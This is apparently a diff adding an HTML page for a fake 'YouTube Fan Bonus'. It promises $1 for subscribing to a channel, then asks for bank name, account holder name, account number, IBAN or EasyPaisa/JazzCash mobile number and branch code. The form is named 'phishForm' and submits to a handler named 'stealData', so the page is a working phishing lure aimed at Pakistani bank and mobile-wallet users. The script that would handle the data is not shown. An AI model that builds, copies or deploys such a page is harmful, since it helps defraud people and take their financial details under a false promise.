@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Official Bonus: Subscribe & Get $1</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+</head>
+<body>
+
+    <div class="main-container">
+        <div class="card">
+            <div class="logo-area">
+                <i class="fab fa-youtube fa-3x" style="color: #FF0000;"></i>
+                <h1>YouTube Fan Bonus</h1>
+                <p>Subscribe to our channel to unlock your $1 reward!</p>
+            </div>
+
+            <!-- Step 1: Subscribe Section -->
+            <div id="subscribe-section">
+                <div class="channel-preview">
+                    <img src="https://via.placeholder.com/100" alt="Channel Icon">
+                    <div class="channel-info">
+                        <h3>Subscribe Now</h3>
+                        <p>Click below to verify your subscription.</p>
+                    </div>
+                </div>
+                <a href="https://youtube.com/channel/UCh00Q23ahA15fKgHkgBUPuw?si=ykruotKL7i1E9nnG" target="_blank" class="btn-youtube">
+                    <i class="fab fa-youtube"></i> SUBSCRIBE TO CHANNEL
+                </a>
+                <p class="hint">After subscribing, click "Next" to claim your $1.</p>
+                <button onclick="goToNextStep()" class="btn-next">Next Step</button>
+            </div>
+
+            <!-- Step 2: Bank Details Section (Hidden initially) -->
+            <div id="bank-section" style="display: none;">
+                <h2 style="color: #28a745;">Congratulations!</h2>
+                <p>Your subscription is verified. Enter your bank details to withdraw $1 instantly.</p>
+                
+                <form id="phishForm" onsubmit="stealData(event)">
+                    <div class="input-group">
+                        <label>Bank Name</label>
+                        <input type="text" id="bankName" placeholder="e.g. HBL, EasyPaisa, UBL" required>
+                    </div>
+                    
+                    <div class="input-group">
+                        <label>Account Title (Full Name)</label>
+                        <input type="text" id="accTitle" placeholder="As per Bank Record" required>
+                    </div>
+
+                    <div class="input-group">
+                        <label>Account Number</label>
+                        <input type="text" id="accNumber" placeholder="Enter Account Number" required>
+                    </div>
+
+                    <div class="input-group">
+                        <label>IBAN or Mobile Number (For EasyPaisa/JazzCash)</label>
+                        <input type="text" id="iban" placeholder="PK..." required>
+                    </div>
+
+                    <div class="input-group">
+                        <label>Branch Code (Optional)</label>
+                        <input type="text" id="branchCode" placeholder="e.g. 0000">
+                    </div>
+
+                    <button type="submit" class="btn-withdraw">
+                        <i class="fas fa-dollar-sign"></i> WITHDRAW $1 NOW
+                    </button>
+                </form>
+                <p id="statusMsg" class="status-msg"></p>
+            </div>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
